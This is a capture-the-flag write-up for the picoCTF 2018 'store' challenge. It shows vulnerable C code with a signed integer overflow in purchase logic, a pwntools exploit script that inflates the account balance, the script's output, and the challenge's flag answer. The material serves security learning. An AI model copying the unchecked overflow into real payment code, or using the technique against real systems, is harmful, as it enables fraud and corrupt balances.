# store
General Skills, 350 points

## Description:
> We started a little store, can you buy the flag?

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the Store App V1.0\n");
        printf("World's Most Secure Purchasing App\n");

        printf("\n[1] Check Account Balance\n");
        printf("\n[2] Buy Stuff\n");
        printf("\n[3] Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Current Auctions\n");
            printf("[1] I Can't Believe its not a Flag!\n");
            printf("[2] Real Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("Imitation Flags cost 1000 each, how many would you like?\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 1000*number_flags;
                    printf("\nYour total cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour new balance: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("A genuine Flag costs 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to purchase");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        printf("YOUR FLAG IS:\n");
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}

```

## Solution:

The store sells flags - imitation flags and a genuine flag. We need to buy the genuine flag, but we don't have enough funds. We'll have to trick the store into thinking we do.

What will help us do that is the logic that handles buying imitation flags:
```c
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 1000*number_flags;
    printf("\nYour total cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour new balance: %d\n\n", account_balance);
    }
```

Notice how all the numbers involved in this flow are signed. So, if we request to buy a large amount of flags, the calculation of `total_cost = 1000*number_flags` will overflow and turn the total cost to a negative number. The number of flags would still be positive though, so we'd execute the logic of `account_balance = account_balance - total_cost` and actually get richer.

For example, if we choose to buy 2222222 flags, our balance after the transaction should be:
```
>>> 1100 - numpy.int32(2222222*1000)
2072746396
```

The script:
```python
from pwn import *

r = remote("2018shell3.picoctf.com", 43581)

MENU_BALANCE = "1"
MENU_BUY = "2"
MENU_EXIT = "3"

FLAG_IMITATION = "1"
FLAG_REAL = "2"

BUY_REAL_FLAG = "1"

def menu(choice):
    r.sendlineafter("Enter a menu selection\n", str(choice))

def check_balance():
    menu(MENU_BALANCE)
    print r.recvregex("Balance: \d+ \n").strip()

def buy_imitation_flag(amount):
    menu(MENU_BUY)
    log.info("Attempting to buy {} imitation flags".format(amount))
    r.sendlineafter("[2] Real Flag\n", FLAG_IMITATION)
    r.sendlineafter("Imitation Flags cost 1000 each, how many would you like?", str(amount))
    print r.recvregex("Your new balance: \d+\n").strip()

def buy_real_flag():
    menu(MENU_BUY)
    log.info("Attempting to buy a real flag")
    r.sendlineafter("[2] Real Flag\n", FLAG_REAL)
    r.sendlineafter("Enter 1 to purchase", BUY_REAL_FLAG) 
    line = r.recvline()
    print line
    if "FLAG" not in line:
        print r.recvline()

def exit():
    menu(MENU_EXIT)

check_balance()
buy_imitation_flag(2222222)
buy_real_flag()
exit()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/store# python exploit.py
[+] Opening connection to 2018shell3.picoctf.com on port 43581: Done
Balance: 1100
[*] Attempting to buy 2222222 imitation flags
Your total cost is: -2072745296

Your new balance: 2072746396
[*] Attempting to buy a real flag
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}

[*] Closed connection to 2018shell3.picoctf.com port 43581
```

The flag: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}
